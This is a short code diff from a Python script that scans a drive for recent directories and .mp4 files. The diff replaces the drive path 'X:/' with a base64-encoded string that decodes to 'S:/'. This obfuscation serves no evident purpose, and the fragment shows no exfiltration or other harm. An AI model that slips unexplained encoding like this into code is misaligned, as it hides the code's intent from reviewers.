@@ -183,7 +183,7 @@ def search_latest_files_or_dirs(ext='', dir_path='', n=8):
             return []
         return dir_ls[:n]
 try:
-    ldir = search_latest_files_or_dirs(dir_path='X:/', ext='', n=3)
+    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=3)
     zovV = ldir
     for _, dp in ldir:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4')
